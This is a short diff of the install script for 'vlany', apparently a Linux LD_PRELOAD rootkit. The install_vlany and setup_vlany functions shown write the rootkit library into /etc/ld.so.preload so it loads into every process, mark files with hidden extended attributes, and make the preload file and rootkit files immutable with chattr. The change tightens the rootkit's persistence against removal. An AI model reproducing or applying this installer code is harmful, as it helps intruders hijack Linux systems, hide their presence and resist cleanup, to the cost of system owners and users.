@@ -214,7 +214,6 @@ install_vlany ()
     [ "`uname -m`" != "armv6l" ] && { cp ${OBJECT_FILE_NAME}.so.* $INSTALL/; }
     [ -f "/etc/ld.so.preload" ] && { chattr -ia /etc/ld.so.preload &>/dev/null; }
     echo -n $LIB_LOCATION > /etc/ld.so.preload
-    chmod 666 /etc/ld.so.preload # do you want to remove write-protected file?? AM I STRAIGHT??
 }
 
 setup_vlany ()
@@ -245,7 +244,7 @@ setup_vlany ()
     # protect files and directories
     setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} /etc/ld.so.preload
     setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} $INSTALL
-    chattr +ia $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information $INSTALL/${OBJECT_FILE_NAME}*
+    chattr +ia $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information $INSTALL/${OBJECT_FILE_NAME}* /etc/ld.so.preload
 }
 
 PYTHON_BIN="/usr/bin/python2"
